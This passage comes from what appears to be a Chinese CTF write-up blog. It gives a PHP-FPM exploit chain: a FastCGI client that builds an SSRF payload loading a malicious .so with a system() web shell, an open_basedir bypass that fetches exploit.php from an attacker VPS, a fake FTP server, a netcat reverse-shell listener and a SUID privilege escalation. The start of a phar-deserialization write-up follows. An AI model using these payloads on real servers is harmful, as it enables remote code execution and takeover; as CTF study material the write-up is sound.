    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token comment">//        $this-&gt;connect();</span>
        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># è¾“å‡ºpayload</span>
<span class="token comment">//        fwrite($this-&gt;_sock, $request);</span>
<span class="token comment">//        do {</span>
<span class="token comment">//            $resp = $this-&gt;readPacket();</span>
<span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {</span>
<span class="token comment">//                $response .= $resp['content'];</span>
<span class="token comment">//            }</span>
<span class="token comment">//        } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span>
<span class="token comment">//        var_dump($resp);</span>
<span class="token comment">//        if (!is_array($resp)) {</span>
<span class="token comment">//            throw new Exception('Bad request');</span>
<span class="token comment">//        }</span>
<span class="token comment">//        switch (ord($resp['content']{4})) {</span>
<span class="token comment">//            case self::CANT_MPX_CONN:</span>
<span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span>
<span class="token comment">//                break;</span>
<span class="token comment">//            case self::OVERLOADED:</span>
<span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span>
<span class="token comment">//                break;</span>
<span class="token comment">//            case self::UNKNOWN_ROLE:</span>
<span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span>
<span class="token comment">//                break;</span>
<span class="token comment">//            case self::REQUEST_COMPLETE:</span>
<span class="token comment">//                return $response;</span>
<span class="token comment">//        }</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// real exploit start here</span>
<span class="token comment">//if (!isset($_REQUEST['cmd'])) {</span>
<span class="token comment">//    die("Check your input\n");</span>
<span class="token comment">//}</span>
<span class="token comment">//if (!isset($_REQUEST['filepath'])) {</span>
<span class="token comment">//    $filepath = __FILE__;</span>
<span class="token comment">//}else{</span>
<span class="token comment">//    $filepath = $_REQUEST['filepath'];</span>
<span class="token comment">//}</span>

<span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span>
<span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span>
<span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?&gt;"</span><span class="token punctuation">;</span> 
<span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = 1.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span>   <span class="token comment">//ä¿®æ”¹è¿™é‡Œçš„soæ–‡ä»¶åç§°å’Œè·¯å¾„</span>
<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=&gt;</span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=&gt;</span> <span class="token variable">$req</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=&gt;</span> <span class="token variable">$uri</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=&gt;</span> <span class="token variable">$req</span><span class="token punctuation">,</span>
<span class="token comment">#'DOCUMENT_ROOT'     =&gt; '/',</span>
    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=&gt;</span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span>    <span class="token comment">// æ³¨æ„è¿™é‡Œçš„FPMç«¯å£</span>
    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=&gt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// print_r($_REQUEST);</span>
<span class="token comment">// print_r($params);</span>
<span class="token comment">//echo "Call: $uri\n\n";</span>
<span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-&gt;</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å°†ä¸Šé¢ä»£ç ä¿å­˜ä¸º<code>exploit.php</code>ï¼Œå†™å…¥ç½‘ç«™<code>/var/www/html/</code>ç›®å½•ï¼Œä¹Ÿå¯ä»¥ç”¨<code>file_put_contents</code>ï¼ŒIPä¿®æ”¹ä¸ºè‡ªå·±vpsåœ°å€</p>
<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(copy('http://[IP]/exploit.php','/var/www/html/exploit.php'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶åè®¿é—®<code>/exploit.php</code>ï¼Œå¾—åˆ°payloadï¼ˆè¿™é‡Œä¹Ÿå¯ä»¥æœ¬åœ°è¿è¡Œç”Ÿæˆpayloadï¼ŒPHPç‰ˆæœ¬å¯¹åº”å¥½å°±è¡Œï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç„¶ååœ¨VPSå¼€å¯FTPæœåŠ¡</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span>
<span class="token comment">#Service ready for new user.</span>
<span class="token comment">#Client send anonymous username</span>
<span class="token comment">#USER anonymous</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#User name okay, need password.</span>
<span class="token comment">#Client send anonymous password.</span>
<span class="token comment">#PASS anonymous</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#User logged in, proceed. Logged out if appropriate.</span>
<span class="token comment">#TYPE I</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#Size /</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#EPSV (1)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span>
<span class="token comment">#PASV</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#æ³¨æ„æ‰“åˆ°9001ç«¯å£</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#QUIT</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ‹¼æ¥payloadå¦‚ä¸‹ï¼ŒIPä¿®æ”¹ä¸ºè‡ªå·±vpsåœ°å€ï¼Œå¼€å¯ç›‘å¬<code>nc -lvnp 9898</code>ï¼ˆè¿™é‡Œç›‘å¬ç«¯å£å’Œ<code>.so</code>æ–‡ä»¶åå¼¹shellçš„ç«¯å£å¯¹åº”ï¼‰ï¼Œç„¶åæ‰§è¡Œpayload</p>
<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=phpinfo();file_put_contents($_GET[%27file%27],$_GET[%27data%27]);&amp;file=ftp://test@[IP]:9999/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è·å–åˆ°www-dataæƒé™</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921162625519.png"></p>
<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œæ‰¾æœ‰suidæƒé™çš„æ–‡ä»¶ï¼Œå‘ç°<code>/usr/local/bin/php</code>æœ‰suidæƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">find / -perm -u=s -type f 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤è·å–flag</p>
<pre class="line-numbers language-none"><code class="language-none">php -a mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/flag'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921163407442.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/yesec/p/15211484.html">https://www.cnblogs.com/yesec/p/15211484.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>åŸºç¡€ååºåˆ—åŒ–</tag>
        <tag>PHPæ•°ç»„keyæº¢å‡º</tag>
        <tag>open_basedirç»•è¿‡</tag>
        <tag>SSRFæ”»å‡»FPMæœåŠ¡</tag>
        <tag>è¢«åŠ¨FTP</tag>
        <tag>SUIDæƒé™</tag>
      </tags>
  </entry>
  <entry>
    <title>HMGCTF2022-FanWebsite</title>
    <url>/posts/15d824d9.html</url>
    <content><![CDATA[<h1 id="HMGCTF2022-FanWebsite"><a href="#HMGCTF2022-FanWebsite" class="headerlink" title="HMGCTF2022-FanWebsite"></a>HMGCTF2022-FanWebsite</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼špharååºåˆ—åŒ–ã€æ–‡ä»¶ä¸Šä¼ </p>
<p>é¢˜ç›®é¦–é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814111657747.png"></p>
<p><a href="http://www.zipæºç æ³„éœ²/">www.zipæºç æ³„éœ²</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814140604382.png"></p>
<p>ä¸»é¡µé¢æ ‡é¢˜æ˜¯Laminas MVC Skeletonï¼Œè¯´æ˜æ˜¯Laminas MVCæ¶æ„çš„æ¡†æ¶</p>
<p>MVCæ¡†æ¶å…ˆçœ‹è·¯ç”±ï¼Œåœ¨<code>www/module/Album/src/Controller/AlbumController.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Album<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">Album<span class="token punctuation">\</span>Model<span class="token punctuation">\</span>AlbumTable</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Laminas<span class="token punctuation">\</span>Mvc<span class="token punctuation">\</span>Controller<span class="token punctuation">\</span>AbstractActionController</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Model<span class="token punctuation">\</span>ViewModel</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Album<span class="token punctuation">\</span>Form<span class="token punctuation">\</span>AlbumForm</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Album<span class="token punctuation">\</span>Form<span class="token punctuation">\</span>UploadForm</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Album<span class="token punctuation">\</span>Model<span class="token punctuation">\</span>Album</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">AlbumController</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractActionController</span>
<span class="token punctuation">{</span>
    <span class="token comment">// Add this property:</span>
    <span class="token keyword">private</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$white_list</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token class-name type-declaration">AlbumTable</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
